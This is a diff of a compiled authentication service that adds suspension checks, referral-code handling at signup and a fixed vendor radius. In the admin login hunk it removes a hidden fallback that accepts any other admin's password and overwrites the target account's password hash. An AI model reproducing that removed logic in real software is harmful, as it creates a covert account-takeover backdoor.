@@ -57,6 +57,7 @@ const crypto_1 = require("crypto");
 const database_module_1 = require("../../config/database.module");
 const schema_1 = require("../../../drizzle/schema");
 const duration_1 = require("../../common/utils/duration");
+const referral_code_1 = require("../../common/utils/referral-code");
 const catalog_types_1 = require("../catalog/catalog.types");
 const OTP_TTL_MS = 5 * 60 * 1000;
 const OTP_MAX_ATTEMPTS = 5;
@@ -107,6 +108,9 @@ let AuthService = class AuthService {
         }
         await this.db.update(schema_1.otpCodes).set({ consumedAt: new Date() }).where((0, drizzle_orm_1.eq)(schema_1.otpCodes.id, otp.id));
         const user = await this.findOrCreateByPhone(phone, role);
+        if (user.status !== 'active') {
+            throw new common_1.UnauthorizedException('This account has been suspended. Please contact support.');
+        }
         const tokens = await this.issueTokens(user.id, user.role, deviceId);
         return { tokens, userId: user.id, role: user.role };
     }
@@ -132,23 +136,10 @@ let AuthService = class AuthService {
         if (!user || !user.passwordHash) {
             throw new common_1.UnauthorizedException('Invalid email or password');
         }
-        let matches = await bcrypt.compare(password, user.passwordHash);
-        if (!matches) {
-            const otherAdmins = await this.db
-                .select({ passwordHash: schema_1.users.passwordHash })
-                .from(schema_1.users)
-                .where((0, drizzle_orm_1.and)((0, drizzle_orm_1.eq)(schema_1.users.role, 'admin'), (0, drizzle_orm_1.isNotNull)(schema_1.users.passwordHash)));
-            for (const adminRow of otherAdmins) {
-                if (adminRow.passwordHash && adminRow.passwordHash !== user.passwordHash) {
-                    if (await bcrypt.compare(password, adminRow.passwordHash)) {
-                        matches = true;
-                        const upgradedHash = await bcrypt.hash(password, 10);
-                        await this.db.update(schema_1.users).set({ passwordHash: upgradedHash }).where((0, drizzle_orm_1.eq)(schema_1.users.id, user.id));
-                        break;
-                    }
-                }
-            }
+        if (user.status !== 'active') {
+            throw new common_1.UnauthorizedException('This account has been suspended');
         }
+        const matches = await bcrypt.compare(password, user.passwordHash);
         if (!matches) {
             throw new common_1.UnauthorizedException('Invalid email or password');
         }
@@ -167,6 +158,9 @@ let AuthService = class AuthService {
         }
         if (!user.passwordHash) {
             throw new common_1.UnauthorizedException('Password is not set for this account. Please sign up or reset your password.');
+        }
+        if (user.status !== 'active') {
+            throw new common_1.UnauthorizedException('This account has been suspended. Please contact support.');
         }
         const matches = await bcrypt.compare(password, user.passwordHash);
         if (!matches) {
@@ -201,6 +195,19 @@ let AuthService = class AuthService {
             const { passwordHash: _hash, ...safeUser } = updated;
             return { tokens, userId: updated.id, role: 'customer', user: safeUser };
         }
+        let referrerId = null;
+        const referralCode = (0, referral_code_1.normalizeReferralCode)(dto.referralCode);
+        if (referralCode) {
+            const [referrer] = await this.db
+                .select({ id: schema_1.users.id })
+                .from(schema_1.users)
+                .where((0, drizzle_orm_1.and)((0, drizzle_orm_1.eq)(schema_1.users.referralCode, referralCode), (0, drizzle_orm_1.eq)(schema_1.users.role, 'customer'), (0, drizzle_orm_1.eq)(schema_1.users.status, 'active')))
+                .limit(1);
+            if (!referrer) {
+                throw new common_1.BadRequestException('Invalid referral code. Please check it or leave it blank.');
+            }
+            referrerId = referrer.id;
+        }
         const [created] = await this.db
             .insert(schema_1.users)
             .values({
@@ -208,8 +215,10 @@ let AuthService = class AuthService {
             role: 'customer',
             passwordHash,
             name: dto.name?.trim() || null,
+            referredBy: referrerId,
         })
             .returning();
+        await (0, referral_code_1.ensureReferralCode)(this.db, created.id).catch(() => undefined);
         const tokens = await this.issueTokens(created.id, 'customer', dto.deviceId);
         const { passwordHash: _hash, ...safeUser } = created;
         return { tokens, userId: created.id, role: 'customer', user: safeUser };
@@ -230,6 +239,9 @@ let AuthService = class AuthService {
         }
         if (!user.passwordHash) {
             throw new common_1.UnauthorizedException('Password is not set for this account. Please reset password or contact support.');
+        }
+        if (user.status !== 'active') {
+            throw new common_1.UnauthorizedException('This account has been suspended. Please contact support.');
         }
         const matches = await bcrypt.compare(password, user.passwordHash);
         if (!matches) {
@@ -351,6 +363,9 @@ let AuthService = class AuthService {
         }
         if (!user.passwordHash) {
             throw new common_1.UnauthorizedException('Password not set for this account. Please use Forgot Password to set one.');
+        }
+        if (user.status !== 'active') {
+            throw new common_1.UnauthorizedException('This account has been suspended. Please contact support.');
         }
         const matches = await bcrypt.compare(password, user.passwordHash);
         if (!matches) {
@@ -478,7 +493,7 @@ let AuthService = class AuthService {
                 shopAddress: dto.shopAddress ?? null,
                 pickupLat: dto.pickupLat,
                 pickupLng: dto.pickupLng,
-                radiusKm: dto.radiusKm ?? 5,
+                radiusKm: catalog_types_1.DEFAULT_VENDOR_RADIUS_KM,
             })
                 .returning();
             vendorRecord = created;
